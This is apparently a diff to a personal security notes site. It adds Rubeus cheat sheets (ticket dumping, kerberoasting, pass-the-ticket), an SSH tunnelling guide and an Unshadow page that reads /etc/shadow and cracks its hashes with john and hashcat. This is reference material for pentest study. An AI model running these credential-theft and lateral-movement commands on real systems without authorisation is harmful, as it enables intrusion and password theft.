+<pre><code class="language-cmd">Rubeus.exe monitor /interval:5
+</code></pre>
+<h3 id="monitor-with-filtering"><a class="header" href="#monitor-with-filtering">Monitor with Filtering</a></h3>
+<pre><code class="language-cmd">Rubeus.exe monitor /interval:5 /filteruser:&lt;username&gt;
+</code></pre>
+<hr>
+<h2 id="common-options-5"><a class="header" href="#common-options-5">Common Options</a></h2>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Option</th><th>Description</th></tr>
+</thead>
+<tbody>
+<tr><td><code>/nowrap</code></td><td>Don’t wrap Base64 output (easier copy-paste)</td></tr>
+<tr><td><code>/ptt</code></td><td>Pass the ticket (import into current session)</td></tr>
+<tr><td><code>/dc:&lt;ip&gt;</code></td><td>Specify domain controller</td></tr>
+<tr><td><code>/domain:&lt;domain&gt;</code></td><td>Specify domain</td></tr>
+<tr><td><code>/user:&lt;user&gt;</code></td><td>Specify user</td></tr>
+<tr><td><code>/outfile:&lt;path&gt;</code></td><td>Write ticket to file</td></tr>
+<tr><td><code>/luid:&lt;luid&gt;</code></td><td>Target specific logon session</td></tr>
+</tbody>
+</table>
+</div>
+<hr>
+<h2 id="one-liners-1"><a class="header" href="#one-liners-1">One-Liners</a></h2>
+<h3 id="dump-all-tickets"><a class="header" href="#dump-all-tickets">Dump All Tickets</a></h3>
+<pre><code class="language-cmd">Rubeus.exe dump /nowrap
+</code></pre>
+<h3 id="request-tgt-and-import"><a class="header" href="#request-tgt-and-import">Request TGT and Import</a></h3>
+<pre><code class="language-cmd">Rubeus.exe asktgt /user:john /domain:domain.local /aes256:&lt;hash&gt; /ptt
+</code></pre>
+<h3 id="kerberoast-and-save"><a class="header" href="#kerberoast-and-save">Kerberoast and Save</a></h3>
+<pre><code class="language-cmd">Rubeus.exe kerberoast /format:hashcat /outfile:hashes.txt
+</code></pre>
+<h3 id="create-sacrificial-session-and-request-tgt"><a class="header" href="#create-sacrificial-session-and-request-tgt">Create Sacrificial Session and Request TGT</a></h3>
+<pre><code class="language-cmd">Rubeus.exe createnetonly /program:cmd.exe /show
+:: In new window:
+Rubeus.exe asktgt /user:john /domain:domain.local /rc4:&lt;hash&gt; /ptt
+</code></pre>
+<hr>
+<h2 id="convert-kirbi-to-base64-powershell"><a class="header" href="#convert-kirbi-to-base64-powershell">Convert .kirbi to Base64 (PowerShell)</a></h2>
+<pre><code class="language-powershell">[Convert]::ToBase64String([IO.File]::ReadAllBytes("ticket.kirbi"))
+</code></pre>
+<h2 id="convert-base64-to-kirbi-powershell"><a class="header" href="#convert-base64-to-kirbi-powershell">Convert Base64 to .kirbi (PowerShell)</a></h2>
+<pre><code class="language-powershell">[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("&lt;base64_string&gt;"))
+</code></pre>
+<div style="break-before: page; page-break-before: always;"></div>
+<h1 id="ssh-cheatsheet"><a class="header" href="#ssh-cheatsheet">SSH Cheatsheet</a></h1>
+<h2 id="basic-connection"><a class="header" href="#basic-connection">Basic Connection</a></h2>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Command</th><th>Description</th></tr>
+</thead>
+<tbody>
+<tr><td><code>ssh user@host</code></td><td>Connect to remote host</td></tr>
+<tr><td><code>ssh -p 2222 user@host</code></td><td>Connect on custom port</td></tr>
+<tr><td><code>ssh -i ~/.ssh/key.pem user@host</code></td><td>Connect with specific key</td></tr>
+<tr><td><code>ssh -v user@host</code></td><td>Verbose mode (debug)</td></tr>
+<tr><td><code>ssh -vvv user@host</code></td><td>Extra verbose</td></tr>
+</tbody>
+</table>
+</div>
+<hr>
+<h2 id="authentication-1"><a class="header" href="#authentication-1">Authentication</a></h2>
+<h3 id="key-based-auth"><a class="header" href="#key-based-auth">Key-Based Auth</a></h3>
+<pre><code class="language-bash"># Generate key pair
+ssh-keygen -t ed25519 -C "comment"
+ssh-keygen -t rsa -b 4096 -C "comment"
+
+# Copy public key to server
+ssh-copy-id user@host
+ssh-copy-id -i ~/.ssh/key.pub user@host
+
+# Manual copy
+cat ~/.ssh/id_ed25519.pub | ssh user@host "mkdir -p ~/.ssh &amp;&amp; cat &gt;&gt; ~/.ssh/authorized_keys"
+</code></pre>
+<h3 id="key-permissions"><a class="header" href="#key-permissions">Key Permissions</a></h3>
+<pre><code class="language-bash">chmod 700 ~/.ssh
+chmod 600 ~/.ssh/id_ed25519
+chmod 644 ~/.ssh/id_ed25519.pub
+chmod 600 ~/.ssh/authorized_keys
+chmod 600 ~/.ssh/config
+</code></pre>
+<hr>
+<h2 id="ssh-config-file"><a class="header" href="#ssh-config-file">SSH Config File</a></h2>
+<p>Location: <code>~/.ssh/config</code></p>
+<pre><code>Host myserver
+    HostName 192.168.1.100
+    User admin
+    Port 22
+    IdentityFile ~/.ssh/myserver_key
+
+Host jumpbox
+    HostName jump.example.com
+    User deployer
+    IdentityFile ~/.ssh/jump_key
+
+Host internal
+    HostName 10.0.0.50
+    User admin
+    ProxyJump jumpbox
+</code></pre>
+<h3 id="config-options"><a class="header" href="#config-options">Config Options</a></h3>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Option</th><th>Description</th></tr>
+</thead>
+<tbody>
+<tr><td><code>HostName</code></td><td>Actual hostname/IP</td></tr>
+<tr><td><code>User</code></td><td>Default username</td></tr>
+<tr><td><code>Port</code></td><td>SSH port</td></tr>
+<tr><td><code>IdentityFile</code></td><td>Path to private key</td></tr>
+<tr><td><code>ProxyJump</code></td><td>Jump host for tunneling</td></tr>
+<tr><td><code>ForwardAgent</code></td><td>Forward SSH agent (yes/no)</td></tr>
+<tr><td><code>LocalForward</code></td><td>Persistent local tunnel</td></tr>
+<tr><td><code>DynamicForward</code></td><td>Persistent SOCKS proxy</td></tr>
+</tbody>
+</table>
+</div>
+<hr>
+<h2 id="port-forwarding--tunneling"><a class="header" href="#port-forwarding--tunneling">Port Forwarding / Tunneling</a></h2>
+<h3 id="local-port-forwarding--l"><a class="header" href="#local-port-forwarding--l">Local Port Forwarding (<code>-L</code>)</a></h3>
+<p>Forward a local port to a remote destination through the SSH server.</p>
+<pre><code>ssh -L [local_addr:]local_port:remote_host:remote_port user@ssh_server
+</code></pre>
+<p><strong>Use case</strong>: Access a service on a remote network that’s not directly reachable.</p>
+<pre><code class="language-bash"># Forward local port 8080 to remote host's port 80
+ssh -L 8080:webserver.internal:80 user@jumphost
+
+# Access via: http://localhost:8080
+</code></pre>
+<h4 id="postgresql-example-remote-db-on-localhost"><a class="header" href="#postgresql-example-remote-db-on-localhost">PostgreSQL Example (Remote DB on localhost)</a></h4>
+<p>Scenario: PostgreSQL on <code>dbserver</code> only listens on <code>127.0.0.1:5432</code>. You need to connect from your workstation.</p>
+<pre><code class="language-bash"># Create tunnel
+ssh -L 5432:localhost:5432 user@dbserver
+
+# Now connect locally
+psql -h localhost -p 5432 -U dbuser -d mydb
+</code></pre>
+<p>Or use a different local port to avoid conflicts:</p>
+<pre><code class="language-bash"># Forward local 15432 to remote's localhost:5432
+ssh -L 15432:localhost:5432 user@dbserver
+
+# Connect via the tunnel
+psql -h localhost -p 15432 -U dbuser -d mydb
+
+# Or with connection string
+psql "postgresql://dbuser:password@localhost:15432/mydb"
+</code></pre>
+<p><strong>Background tunnel (no shell):</strong></p>
+<pre><code class="language-bash">ssh -fNL 15432:localhost:5432 user@dbserver
+
+# -f: Background after auth
+# -N: No remote command (tunnel only)
+# -L: Local forward
+</code></pre>
+<h4 id="multiple-forwards"><a class="header" href="#multiple-forwards">Multiple Forwards</a></h4>
+<pre><code class="language-bash">ssh -L 5432:localhost:5432 -L 6379:localhost:6379 user@server
+</code></pre>
+<hr>
+<h3 id="remote-port-forwarding--r"><a class="header" href="#remote-port-forwarding--r">Remote Port Forwarding (<code>-R</code>)</a></h3>
+<p>Expose a local service to the remote network.</p>
+<pre><code>ssh -R [remote_addr:]remote_port:local_host:local_port user@ssh_server
+</code></pre>
+<p><strong>Use case</strong>: Make your local dev server accessible from the remote server.</p>
+<pre><code class="language-bash"># Expose local port 3000 on remote server's port 8080
+ssh -R 8080:localhost:3000 user@remote
+
+# On remote: curl localhost:8080 hits your local :3000
+</code></pre>
+<hr>
+<h3 id="dynamic-port-forwarding--d---socks-proxy"><a class="header" href="#dynamic-port-forwarding--d---socks-proxy">Dynamic Port Forwarding (<code>-D</code>) - SOCKS Proxy</a></h3>
+<p>Create a SOCKS proxy that routes all traffic through the SSH server.</p>
+<pre><code>ssh -D [local_addr:]local_port user@ssh_server
+</code></pre>
+<p><strong>Use case</strong>: Browse the web or access multiple services as if you were on the remote network.</p>
+<pre><code class="language-bash"># Create SOCKS5 proxy on localhost:1080
+ssh -D 1080 user@remote
+
+# Configure browser/apps to use SOCKS5 proxy: localhost:1080
+</code></pre>
+<h4 id="using-the-socks-proxy"><a class="header" href="#using-the-socks-proxy">Using the SOCKS Proxy</a></h4>
+<p><strong>curl:</strong></p>
+<pre><code class="language-bash">curl --socks5 localhost:1080 http://internal.site.local
+</code></pre>
+<p><strong>proxychains:</strong></p>
+<pre><code class="language-bash"># /etc/proxychains.conf
+socks5 127.0.0.1 1080
+
+# Run commands through proxy
+proxychains psql -h db.internal -U admin -d mydb
+proxychains nmap -sT 10.0.0.0/24
+</code></pre>
+<p><strong>Browser</strong>: Configure SOCKS5 proxy in Firefox/Chrome settings or use FoxyProxy.</p>
+<h4 id="postgresql-via-socks-proxy"><a class="header" href="#postgresql-via-socks-proxy">PostgreSQL via SOCKS Proxy</a></h4>
+<pre><code class="language-bash"># Start SOCKS proxy
+ssh -D 1080 user@jumphost
+
+# Use proxychains
+proxychains psql -h db.internal.local -p 5432 -U dbuser -d mydb
+</code></pre>
+<hr>
+<h2 id="tunnel-comparison"><a class="header" href="#tunnel-comparison">Tunnel Comparison</a></h2>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Type</th><th>Flag</th><th>Direction</th><th>Use Case</th></tr>
+</thead>
+<tbody>
+<tr><td>Local</td><td><code>-L</code></td><td>Local → Remote</td><td>Access remote service locally</td></tr>
+<tr><td>Remote</td><td><code>-R</code></td><td>Remote → Local</td><td>Expose local service remotely</td></tr>
+<tr><td>Dynamic</td><td><code>-D</code></td><td>SOCKS Proxy</td><td>Route all traffic through SSH</td></tr>
+</tbody>
+</table>
+</div>
+<hr>
+<h2 id="tunnel-options"><a class="header" href="#tunnel-options">Tunnel Options</a></h2>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Flag</th><th>Description</th></tr>
+</thead>
+<tbody>
+<tr><td><code>-f</code></td><td>Background after authentication</td></tr>
+<tr><td><code>-N</code></td><td>No remote command (tunnel only)</td></tr>
+<tr><td><code>-T</code></td><td>Disable pseudo-terminal allocation</td></tr>
+<tr><td><code>-g</code></td><td>Allow remote hosts to connect to forwarded ports</td></tr>
+</tbody>
+</table>
+</div>
+<h3 id="common-tunnel-command"><a class="header" href="#common-tunnel-command">Common Tunnel Command</a></h3>
+<pre><code class="language-bash"># Background tunnel, no shell
+ssh -fNT -L 5432:localhost:5432 user@server
+
+# Check tunnel is running
+ps aux | grep ssh
+lsof -i :5432
+</code></pre>
+<hr>
+<h2 id="jump-hosts--bastion"><a class="header" href="#jump-hosts--bastion">Jump Hosts / Bastion</a></h2>
+<h3 id="proxyjump-modern"><a class="header" href="#proxyjump-modern">ProxyJump (Modern)</a></h3>
+<pre><code class="language-bash">ssh -J jumphost user@internal
+
+# Multiple jumps
+ssh -J jump1,jump2 user@internal
+</code></pre>
+<h3 id="proxycommand-legacy"><a class="header" href="#proxycommand-legacy">ProxyCommand (Legacy)</a></h3>
+<pre><code class="language-bash">ssh -o ProxyCommand="ssh -W %h:%p jumphost" user@internal
+</code></pre>
+<h3 id="config-file"><a class="header" href="#config-file">Config File</a></h3>
+<pre><code>Host internal
+    HostName 10.0.0.50
+    User admin
+    ProxyJump jumphost
+</code></pre>
+<hr>
+<h2 id="ssh-agent"><a class="header" href="#ssh-agent">SSH Agent</a></h2>
+<pre><code class="language-bash"># Start agent
+eval $(ssh-agent)
+
+# Add key
+ssh-add ~/.ssh/id_ed25519
+
+# Add with timeout (1 hour)
+ssh-add -t 3600 ~/.ssh/id_ed25519
+
+# List keys
+ssh-add -l
+
+# Remove all keys
+ssh-add -D
+</code></pre>
+<h3 id="agent-forwarding"><a class="header" href="#agent-forwarding">Agent Forwarding</a></h3>
+<pre><code class="language-bash">ssh -A user@host
+</code></pre>
+<p><strong>Warning</strong>: Agent forwarding can be a security risk on untrusted hosts.</p>
+<hr>
+<h2 id="file-transfer"><a class="header" href="#file-transfer">File Transfer</a></h2>
+<h3 id="scp"><a class="header" href="#scp">SCP</a></h3>
+<pre><code class="language-bash"># Upload
+scp file.txt user@host:/path/
+
+# Download
+scp user@host:/path/file.txt ./
+
+# Recursive
+scp -r folder/ user@host:/path/
+
+# With custom port
+scp -P 2222 file.txt user@host:/path/
+</code></pre>
+<h3 id="sftp"><a class="header" href="#sftp">SFTP</a></h3>
+<pre><code class="language-bash">sftp user@host
+sftp&gt; put localfile
+sftp&gt; get remotefile
+sftp&gt; ls
+sftp&gt; cd /path
+sftp&gt; exit
+</code></pre>
+<h3 id="rsync-over-ssh"><a class="header" href="#rsync-over-ssh">Rsync over SSH</a></h3>
+<pre><code class="language-bash">rsync -avz -e ssh source/ user@host:/dest/
+rsync -avz -e "ssh -p 2222" source/ user@host:/dest/
+</code></pre>
+<hr>
+<h2 id="escape-sequences"><a class="header" href="#escape-sequences">Escape Sequences</a></h2>
+<p>Press <code>~</code> after newline:</p>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Sequence</th><th>Action</th></tr>
+</thead>
+<tbody>
+<tr><td><code>~.</code></td><td>Disconnect</td></tr>
+<tr><td><code>~^Z</code></td><td>Background SSH</td></tr>
+<tr><td><code>~#</code></td><td>List forwarded connections</td></tr>
+<tr><td><code>~?</code></td><td>Help</td></tr>
+<tr><td><code>~C</code></td><td>Open command line (add forwards)</td></tr>
+</tbody>
+</table>
+</div>
+<h3 id="add-forward-to-running-session"><a class="header" href="#add-forward-to-running-session">Add Forward to Running Session</a></h3>
+<pre><code>~C
+ssh&gt; -L 8080:localhost:80
+</code></pre>
+<hr>
+<h2 id="security-options"><a class="header" href="#security-options">Security Options</a></h2>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Option</th><th>Description</th></tr>
+</thead>
+<tbody>
+<tr><td><code>-o StrictHostKeyChecking=yes</code></td><td>Reject unknown hosts</td></tr>
+<tr><td><code>-o UserKnownHostsFile=/dev/null</code></td><td>Don’t save host keys</td></tr>
+<tr><td><code>-o PasswordAuthentication=no</code></td><td>Force key auth</td></tr>
+<tr><td><code>-o PubkeyAuthentication=yes</code></td><td>Enable key auth</td></tr>
+</tbody>
+</table>
+</div>
+<h3 id="disable-host-key-checking-testing-only"><a class="header" href="#disable-host-key-checking-testing-only">Disable Host Key Checking (Testing Only)</a></h3>
+<pre><code class="language-bash">ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null user@host
+</code></pre>
+<hr>
+<h2 id="practical-examples"><a class="header" href="#practical-examples">Practical Examples</a></h2>
+<h3 id="access-remote-postgresql-localhost-only"><a class="header" href="#access-remote-postgresql-localhost-only">Access Remote PostgreSQL (localhost only)</a></h3>
+<pre><code class="language-bash"># Scenario: PostgreSQL on server only binds to 127.0.0.1:5432
+
+# Option 1: Local forward
+ssh -L 5432:127.0.0.1:5432 user@dbserver
+psql -h localhost -U postgres -d mydb
+
+# Option 2: Different local port
+ssh -fNL 15432:127.0.0.1:5432 user@dbserver
+psql -h localhost -p 15432 -U postgres -d mydb
+
+# Option 3: Via jump host
+ssh -L 5432:dbserver.internal:5432 user@jumphost
+psql -h localhost -U postgres -d mydb
+</code></pre>
+<h3 id="access-remote-redis"><a class="header" href="#access-remote-redis">Access Remote Redis</a></h3>
+<pre><code class="language-bash">ssh -L 6379:localhost:6379 user@server
+redis-cli -h localhost
+</code></pre>
+<h3 id="browse-internal-network"><a class="header" href="#browse-internal-network">Browse Internal Network</a></h3>
+<pre><code class="language-bash">ssh -D 9050 user@internal-host
+# Configure browser SOCKS5: localhost:9050
+</code></pre>
+<h3 id="tunnel-to-multiple-services"><a class="header" href="#tunnel-to-multiple-services">Tunnel to Multiple Services</a></h3>
+<pre><code class="language-bash">ssh -L 5432:localhost:5432 \
+    -L 6379:localhost:6379 \
+    -L 8080:webapp.internal:80 \
+    user@jumphost
+</code></pre>
+<hr>
+<h2 id="troubleshooting"><a class="header" href="#troubleshooting">Troubleshooting</a></h2>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Issue</th><th>Solution</th></tr>
+</thead>
+<tbody>
+<tr><td>Connection refused</td><td>Check SSH service, firewall, port</td></tr>
+<tr><td>Permission denied</td><td>Check key permissions, user, auth method</td></tr>
+<tr><td>Host key changed</td><td>Remove old key: <code>ssh-keygen -R host</code></td></tr>
+<tr><td>Tunnel not working</td><td>Check if remote port is listening on localhost</td></tr>
+<tr><td>Broken pipe</td><td>Add <code>ServerAliveInterval 60</code> to config</td></tr>
+</tbody>
+</table>
+</div>
+<h3 id="debug-connection"><a class="header" href="#debug-connection">Debug Connection</a></h3>
+<pre><code class="language-bash">ssh -vvv user@host
+</code></pre>
+<h3 id="keep-connection-alive"><a class="header" href="#keep-connection-alive">Keep Connection Alive</a></h3>
+<pre><code># ~/.ssh/config
+Host *
+    ServerAliveInterval 60
+    ServerAliveCountMax 3
+</code></pre>
 <div style="break-before: page; page-break-before: always;"></div>
 <h1 id="clouds"><a class="header" href="#clouds">Clouds</a></h1>
 <p>Notes related to various cloud service providers.</p>
@@ -15455,7 +16265,7 @@ Oracle File Upload Test
 <li><a href="#securing-kube-apiserver">Securing kube-apiserver</a>
 <ul>
 <li><a href="#access-controls">Access Controls</a></li>
-<li><a href="#authentication-1">Authentication</a></li>
+<li><a href="#authentication-2">Authentication</a></li>
 </ul>
 </li>
 </ul>
@@ -15464,7 +16274,7 @@ Oracle File Upload Test
 <p><a href="#2-cluster-hardening">Cluster Hardening</a></p>
 <ul>
 <li><a href="#securing-access-to-the-kubeapi-server">Securing Access to the KubeAPI Server</a></li>
-<li><a href="#authentication-1">Authentication</a>
+<li><a href="#authentication-2">Authentication</a>
 <ul>
 <li><a href="#user-accounts">User accounts</a></li>
 <li><a href="#service-accounts">Service Accounts</a></li>
@@ -16834,7 +17644,7 @@ k8s:enc:aescbc:v1:key1:ܨt&gt;;8ܑ%TUIodEs*lsHGwjeF8S!Aqaj\Pq;9Ⱥ7dJe{B2=|p4#'B
 <li>kube-apiserver should only listen on an HTTPS endpoint. There was an option to host kube-apiserver on an HTTP endpoint, but this option has been deprecated as of 1.10 and removed in 1.22</li>
 <li>kube-apiserver should have auditing enabled</li>
 </ul>
-<h3 id="authentication-1"><a class="header" href="#authentication-1">Authentication</a></h3>
+<h3 id="authentication-2"><a class="header" href="#authentication-2">Authentication</a></h3>
 <ul>
 <li>One can authentication to the KubeAPI server using certificates or a kubeconfig file</li>
 </ul>
@@ -18494,7 +19304,7 @@ EOF
 <li><a href="#daemonsets">DaemonSets</a></li>
 <li><a href="#static-pods">Static Pods</a></li>
 <li><a href="#multiple-schedulers">Multiple Schedulers</a></li>
-<li><a href="#authentication-2">Authentication</a></li>
+<li><a href="#authentication-3">Authentication</a></li>
 <li><a href="#authorization-1">Authorization</a></li>
 <li><a href="#api-groups">API Groups</a></li>
 <li><a href="#role-based-access-control-rbac">Role-Based Access Control (RBAC)</a></li>
@@ -18787,7 +19597,7 @@ spec:
 <li>Kubernetes supports multiple schedulers that can be used to schedule pods in a cluster.</li>
 <li>You can even create your own schedule and use it to schedule pods in a cluster.</li>
 </ul>
-<h2 id="authentication-2"><a class="header" href="#authentication-2">Authentication</a></h2>
+<h2 id="authentication-3"><a class="header" href="#authentication-3">Authentication</a></h2>
 <ul>
 <li>Authentication is the process of verifying the identity of a user or system.</li>
 <li>Kubernetes supports multiple authentication methods, including:
@@ -19288,7 +20098,7 @@ spec:
 </ul>
 </li>
 </ul>
-<h2 id="authentication-3"><a class="header" href="#authentication-3">Authentication</a></h2>
+<h2 id="authentication-4"><a class="header" href="#authentication-4">Authentication</a></h2>
 <ul>
 <li>Kubernetes does not manage user accounts itself. It depends on an external service to do that.</li>
 <li>All authentication is managed by the kube-api server</li>
@@ -21334,7 +22144,7 @@ The SLOWLOG GET command returns entries from the slow log in chronological order
 <li><a href="#linux-observability-sources">Observability Sources</a></li>
 <li><a href="#per-process-analysis">Per-Process Analysis</a></li>
 <li><a href="#system-wide-analysis">System-Wide Analysis</a></li>
-<li><a href="#troubleshooting">Troubleshooting</a></li>
+<li><a href="#troubleshooting-1">Troubleshooting</a></li>
 </ul>
 <h2 id="subdirectories"><a class="header" href="#subdirectories">Subdirectories</a></h2>
 <h3 id="bash"><a class="header" href="#bash"><a href="systems/bash">Bash</a></a></h3>
@@ -23136,7 +23946,7 @@ nice day, isn't it?
 <li></li>
 </ul>
 <div style="break-before: page; page-break-before: always;"></div>
-<h1 id="troubleshooting"><a class="header" href="#troubleshooting">troubleshooting</a></h1>
+<h1 id="troubleshooting-1"><a class="header" href="#troubleshooting-1">troubleshooting</a></h1>
 <h2 id="measure-cpu-time-of-a-process"><a class="header" href="#measure-cpu-time-of-a-process">Measure CPU time of a process</a></h2>
 <p>We can measure CPU time using <code>time</code>. Be aware that there are two implementations of <code>time</code>, and you may be running the wrong one. There is a bash built-in named <code>time</code>, which does not provide extensive statistics. You want to use the time utility at <code>/usr/bin/time</code>. Run <code>which time</code> to see which one you are using.</p>
 <pre><code class="language-sh">ryan:// $ time httping -delay 2 www.google.com
@@ -23978,17 +24788,19 @@ PID        TTY     STAT   TIME          CMD
 <ul>
 <li><a href="#need-to-addrefine">cli-tool-improvements</a></li>
 <li><a href="#instructions-for-using-dnspinger">dnspinger</a></li>
+<li><a href="#ffuf">ffuf</a></li>
+<li><a href="#hashcat">hashcat</a></li>
 <li><a href="#hydra">hydra</a></li>
-<li><a href="#msfvenom">msfvenom</a></li>
-<li><a href="#metasploit-framework">metasploit</a></li>
-<li><a href="#nmap-1">nmap</a></li>
+<li><a href="#john-the-ripper">john</a></li>
+<li><a href="#lazagne">lazagne</a></li>
 <li><a href="#medusa">medusa</a></li>
 <li><a href="#metasploit-framework">metasploit</a></li>
-<li><a href="#hashcat">hashcat</a></li>
-<li><a href="#john-the-ripper">john</a></li>
+<li><a href="#mimikatz">mimikatz</a></li>
+<li><a href="#msfvenom">msfvenom</a></li>
+<li><a href="#nmap-1">nmap</a></li>
 <li><a href="#pypykatz">pypykatz</a></li>
-<li><a href="#lazagne">lazagne</a></li>
-<li><a href="tools/unshadow.html">unshadow</a></li>
+<li><a href="#rubeus">rubeus</a></li>
+<li><a href="#unshadow">unshadow</a></li>
 </ul>
 <div style="break-before: page; page-break-before: always;"></div>
 <h1 id="need-to-addrefine"><a class="header" href="#need-to-addrefine">Need to add/refine:</a></h1>
@@ -24447,7 +25259,7 @@ sudo apt-get -y install medusa
 sudo apt-get -y install hydra
 </code></pre>
 <hr>
-<h2 id="basic-syntax-3"><a class="header" href="#basic-syntax-3">Basic Syntax</a></h2>
+<h2 id="basic-syntax-6"><a class="header" href="#basic-syntax-6">Basic Syntax</a></h2>
 <p>Hydra’s basic syntax is:</p>
 <pre><code class="language-sh">hydra [login_options] [password_options] [attack_options] [service_options] service://server
 </code></pre>
@@ -26686,7 +27498,7 @@ sudo apt-get install john
 <pre><code class="language-sh">sudo apt-get install john-jumbo
 </code></pre>
 <hr>
-<h2 id="basic-syntax-4"><a class="header" href="#basic-syntax-4">Basic Syntax</a></h2>
+<h2 id="basic-syntax-7"><a class="header" href="#basic-syntax-7">Basic Syntax</a></h2>
 <pre><code class="language-sh">john [options] &lt;hash_file&gt;
 </code></pre>
 <hr>
@@ -26721,7 +27533,7 @@ sudo apt-get install john
 <pre><code class="language-sh">john --incremental hashes.txt
 </code></pre>
 <hr>
-<h2 id="common-options-5"><a class="header" href="#common-options-5">Common Options</a></h2>
+<h2 id="common-options-6"><a class="header" href="#common-options-6">Common Options</a></h2>
 <div class="table-wrapper">
 <table>
 <thead>
@@ -27029,7 +27841,7 @@ cd pypykatz
 pip3 install .
 </code></pre>
 <hr>
-<h2 id="basic-usage-2"><a class="header" href="#basic-usage-2">Basic Usage</a></h2>
+<h2 id="basic-usage-3"><a class="header" href="#basic-usage-3">Basic Usage</a></h2>
 <h3 id="parse-lsass-memory-dump"><a class="header" href="#parse-lsass-memory-dump">Parse LSASS Memory Dump</a></h3>
 <pre><code class="language-bash">pypykatz lsa minidump lsass.dmp
 </code></pre>
@@ -27069,7 +27881,7 @@ pypykatz dpapi prekey password &lt;SID&gt; &lt;password&gt;
 </code></pre>
 <hr>
 <h2 id="lsass-dump-analysis-1"><a class="header" href="#lsass-dump-analysis-1">LSASS Dump Analysis</a></h2>
-<h3 id="full-credential-dump"><a class="header" href="#full-credential-dump">Full Credential Dump</a></h3>
+<h3 id="full-credential-dump-1"><a class="header" href="#full-credential-dump-1">Full Credential Dump</a></h3>
 <pre><code class="language-bash">pypykatz lsa minidump lsass.dmp
 </code></pre>
 <h3 id="output-formats-1"><a class="header" href="#output-formats-1">Output Formats</a></h3>
@@ -27252,7 +28064,7 @@ pip3 install -r requirements.txt
 python3 laZagne.py all
 </code></pre>
 <hr>
-<h2 id="basic-usage-3"><a class="header" href="#basic-usage-3">Basic Usage</a></h2>
+<h2 id="basic-usage-4"><a class="header" href="#basic-usage-4">Basic Usage</a></h2>
 <h3 id="extract-all-credentials"><a class="header" href="#extract-all-credentials">Extract All Credentials</a></h3>
 <pre><code class="language-bash"># Windows
 laZagne.exe all
@@ -27485,7 +28297,7 @@ type C:\Temp\credentials.json
 <li>DPAPI calls</li>
 <li>Access to Credential Manager stores</li>
 </ul>
-<h3 id="evasion-tips"><a class="header" href="#evasion-tips">Evasion Tips</a></h3>
+<h3 id="evasion-tips-1"><a class="header" href="#evasion-tips-1">Evasion Tips</a></h3>
 <ul>
 <li>Compile from source with modifications</li>
 <li>Use Python script instead of binary</li>
@@ -27519,7 +28331,512 @@ type C:\Temp\credentials.json
 <li>Combine with Mimikatz/pypykatz for comprehensive credential extraction</li>
 </ul>
 <div style="break-before: page; page-break-before: always;"></div>
-<h1 id="troubleshooting-1"><a class="header" href="#troubleshooting-1">Troubleshooting</a></h1>
+<h1 id="unshadow"><a class="header" href="#unshadow">Unshadow</a></h1>
+<p>Unshadow is a utility included with John the Ripper that combines the <code>/etc/passwd</code> and <code>/etc/shadow</code> files into a single file format suitable for password cracking. This combined format is what John the Ripper’s single crack mode was specifically designed for.</p>
+<hr>
+<h2 id="purpose"><a class="header" href="#purpose">Purpose</a></h2>
+<p>On modern Linux systems, user information is split between two files:</p>
+<ul>
+<li><code>/etc/passwd</code> - Contains user account info (username, UID, GID, GECOS, home, shell) - world-readable</li>
+<li><code>/etc/shadow</code> - Contains password hashes - readable only by root</li>
+</ul>
+<p>Unshadow merges these files so that password crackers have access to both the hash and the user context (username, real name from GECOS field) in a single file.</p>
+<hr>
+<h2 id="installation-8"><a class="header" href="#installation-8">Installation</a></h2>
+<p>Unshadow comes bundled with John the Ripper. On Debian-based systems:</p>
+<pre><code class="language-sh">sudo apt-get install john
+</code></pre>
+<p>Verify installation:</p>
+<pre><code class="language-sh">which unshadow
+</code></pre>
+<hr>
+<h2 id="basic-syntax-8"><a class="header" href="#basic-syntax-8">Basic Syntax</a></h2>
+<pre><code class="language-sh">unshadow &lt;passwd_file&gt; &lt;shadow_file&gt; &gt; &lt;output_file&gt;
+</code></pre>
+<hr>
+<h2 id="usage"><a class="header" href="#usage">Usage</a></h2>
+<h3 id="step-1-copy-system-files"><a class="header" href="#step-1-copy-system-files">Step 1: Copy System Files</a></h3>
+<p>Always work with copies to avoid modifying system files:</p>
+<pre><code class="language-sh">sudo cp /etc/passwd /tmp/passwd.bak
+sudo cp /etc/shadow /tmp/shadow.bak
+</code></pre>
+<h3 id="step-2-combine-files"><a class="header" href="#step-2-combine-files">Step 2: Combine Files</a></h3>
+<pre><code class="language-sh">unshadow /tmp/passwd.bak /tmp/shadow.bak &gt; /tmp/unshadowed.hashes
+</code></pre>
+<h3 id="step-3-crack-with-john-the-ripper"><a class="header" href="#step-3-crack-with-john-the-ripper">Step 3: Crack with John the Ripper</a></h3>
+<p><strong>Single Crack Mode (Recommended for Linux credentials):</strong></p>
+<p>Single crack mode uses the username, home directory, and GECOS field to generate password candidates. This is highly effective because users often base passwords on their name or username.</p>
+<pre><code class="language-sh">john --single /tmp/unshadowed.hashes
+</code></pre>
+<p><strong>Wordlist Mode:</strong></p>
+<pre><code class="language-sh">john --wordlist=/usr/share/wordlists/rockyou.txt /tmp/unshadowed.hashes
+</code></pre>
+<p><strong>Show Cracked Passwords:</strong></p>
+<pre><code class="language-sh">john --show /tmp/unshadowed.hashes
+</code></pre>
+<h3 id="alternative-crack-with-hashcat"><a class="header" href="#alternative-crack-with-hashcat">Alternative: Crack with hashcat</a></h3>
+<pre><code class="language-sh">hashcat -m 1800 -a 0 /tmp/unshadowed.hashes /usr/share/wordlists/rockyou.txt -o cracked.txt
+</code></pre>
+<hr>
+<h2 id="output-format-1"><a class="header" href="#output-format-1">Output Format</a></h2>
+<p>The unshadowed file combines fields from both source files:</p>
+<p><strong>Input (passwd):</strong></p>
+<pre><code>htb-student:x:1000:1000:HTB Student,,,:/home/htb-student:/bin/bash
+</code></pre>
+<p><strong>Input (shadow):</strong></p>
+<pre><code>htb-student:$y$j9T$3QSBB6CbHEu...f8Ms:18955:0:99999:7:::
+</code></pre>
+<p><strong>Output (unshadowed):</strong></p>
